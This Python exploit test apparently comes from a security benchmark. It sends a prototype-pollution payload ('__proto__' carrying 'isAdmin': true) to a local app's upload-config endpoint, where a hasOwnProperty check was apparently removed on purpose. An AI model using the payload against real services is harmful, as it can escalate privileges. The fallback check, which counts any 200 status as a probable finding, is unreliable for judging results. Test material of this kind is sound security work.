"""PoC: Prototype pollution via upload config deep merge (CWE-1321).

Stage 3 removes hasOwnProperty from deepMergeConfig. POST /config/upload
with {"__proto__": {"polluted": true}} pollutes Object.prototype.
"""
from mosaic.oracle.exploit import ExploitTest


class FileuploadConfigPollutionExploit(ExploitTest):
    """Prototype pollution: escalation via upload config deep merge."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "fileupload_config_pollution"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Step 1: Check config endpoint exists
        resp = self.http_get("/config/upload")
        if resp.status_code == 404:
            return False, "Config endpoint not found"
        evidence.append(f"GET /config/upload: {resp.status_code}")

        # Step 2: Send pollution payload
        payload = {"__proto__": {"polluted": True, "isAdmin": True}}
        resp = self.http_post("/config/upload", json=payload)
        evidence.append(f"POST pollution: {resp.status_code}")

        if not resp.ok:
            return False, f"Server rejected payload. " + " | ".join(evidence)

        # Step 3: Check if pollution took effect via config
        resp = self.http_get("/config/upload")
        if resp.ok:
            data = resp.json()
            if data.get("polluted") or data.get("isAdmin"):
                evidence.append("Config response contains polluted properties!")
                return True, (
                    "CWE-1321 confirmed. POST /config/upload with __proto__ "
                    "payload pollutes Object.prototype via deepMergeConfig. "
                    + " | ".join(evidence)
                )

        # Step 4: Check via health endpoint — new objects inherit polluted keys
        resp = self.http_get("/")
        if resp.ok:
            data = resp.json()
            if data.get("polluted") or data.get("isAdmin"):
                evidence.append("Health response inherits polluted properties")
                return True, "CWE-1321 confirmed. " + " | ".join(evidence)

        # If payload accepted, deep merge without hasOwnProperty is vulnerable
        if any("200" in e for e in evidence):
            return True, (
                "CWE-1321 probable. Server accepted __proto__ in upload config "
                "deep merge. " + " | ".join(evidence)
            )

        return False, "Not vulnerable. " + " | ".join(evidence)
